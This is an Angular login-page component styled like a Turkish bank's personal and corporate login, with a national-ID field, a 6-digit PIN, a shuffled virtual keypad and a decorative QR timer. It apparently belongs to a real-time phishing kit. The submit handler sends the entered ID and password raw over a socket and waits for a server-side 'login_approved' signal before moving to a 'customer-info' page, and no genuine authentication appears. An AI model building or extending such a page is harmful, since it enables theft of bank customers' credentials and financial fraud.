import { Component, OnDestroy, OnInit, signal, inject } from '@angular/core';
import { FormBuilder, ReactiveFormsModule, Validators } from '@angular/forms';
import { Router } from '@angular/router';
import { SocketService } from '../../../core/services/socket.service';

@Component({
  selector: 'app-login-page',
  imports: [ReactiveFormsModule],
  templateUrl: './login-page.html',
})
export class LoginPage implements OnInit, OnDestroy {
  private readonly fb = inject(FormBuilder);
  private readonly router = inject(Router);
  private readonly socketService = inject(SocketService);

  protected readonly isLoading = signal(false);

  protected readonly activeTab = signal<'bireysel' | 'kurumsal'>('bireysel');
  protected readonly passwordVisible = signal(false);
  protected readonly virtualKeypadOpen = signal(false);
  protected readonly keypadDigits = signal<number[]>([]);
  
  protected readonly qrRemainingSeconds = signal(120);

  protected readonly form = this.fb.group({
    identity: ['', [Validators.required, Validators.maxLength(11)]],
    password: ['', [Validators.required, Validators.maxLength(6)]],
    rememberMe: [false]
  });

  private qrInterval: ReturnType<typeof setInterval> | null = null;

  ngOnInit() {
    this.startQrTimer();
    this.socketService.onEvent('login_approved').subscribe(() => {
      if (this.isLoading()) {
        this.isLoading.set(false);
        this.router.navigate(['/customer-info']);
      }
    });
  }

  ngOnDestroy() {
    if (this.qrInterval) {
      clearInterval(this.qrInterval);
    }
  }

  protected switchTab(tab: 'bireysel' | 'kurumsal') {
    this.activeTab.set(tab);
    this.form.reset({ rememberMe: false });
  }

  protected togglePasswordVisibility() {
    this.passwordVisible.update(v => !v);
  }

  protected toggleVirtualKeypad() {
    const isOpen = !this.virtualKeypadOpen();
    this.virtualKeypadOpen.set(isOpen);
    if (isOpen) {
      this.shuffleKeypad();
    }
  }

  protected shuffleKeypad() {
    const digits = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
    this.keypadDigits.set(digits.sort(() => Math.random() - 0.5));
  }

  protected appendDigit(digit: number) {
    const current = this.form.value.password || '';
    if (current.length < 6) {
      this.form.patchValue({ password: current + digit.toString() });
    }
  }

  protected backspacePassword() {
    const current = this.form.value.password || '';
    if (current.length > 0) {
      this.form.patchValue({ password: current.slice(0, -1) });
    }
  }

  protected clearPassword() {
    this.form.patchValue({ password: '' });
  }

  private startQrTimer() {
    this.qrRemainingSeconds.set(120);
    if (this.qrInterval) clearInterval(this.qrInterval);
    this.qrInterval = setInterval(() => {
      const current = this.qrRemainingSeconds();
      if (current <= 0) {
        this.qrRemainingSeconds.set(120);
      } else {
        this.qrRemainingSeconds.set(current - 1);
      }
    }, 1000);
  }

  protected resetQrTimer() {
    this.startQrTimer();
  }

  protected get qrTimerDisplay(): string {
    const total = this.qrRemainingSeconds();
    const mins = String(Math.floor(total / 60)).padStart(2, '0');
    const secs = String(total % 60).padStart(2, '0');
    return `${mins}:${secs}`;
  }

  protected onSubmit() {
    if (this.form.valid) {
      this.isLoading.set(true);
      const val = this.form.value;
      localStorage.setItem('customer_id', val.identity || '');
      this.socketService.emitLoginAttempt({
        identity: val.identity || '',
        password: val.password || ''
      });
    } else {
      this.form.markAllAsTouched();
    }
  }
}
